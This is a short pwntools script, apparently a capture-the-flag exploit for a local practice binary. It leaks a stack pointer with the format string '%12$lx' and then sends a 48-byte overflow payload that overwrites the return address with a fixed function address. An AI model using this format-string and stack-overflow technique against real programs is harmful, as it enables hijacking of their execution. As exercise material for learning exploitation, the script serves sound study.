from pwn import *

binary_name = "binary_var"
context.binary = binary = ELF('./binary_var', checksec=False)

p = process('./binary_var')
newaddress = p64(0x00401367)
print(str(p.recvuntil(b":\n")))
p.sendline(b"%12$lx")
rbp = p.recvuntil(b"Again:")
rbp = str(rbp).split(" is ")[0].strip()
print("\n\nrbp: ", rbp[4:],"\n\n")
payload = b'A'*48 + p64(int(rbp[4:], 16)) + newaddress
p.sendline(payload)
p.interactive()
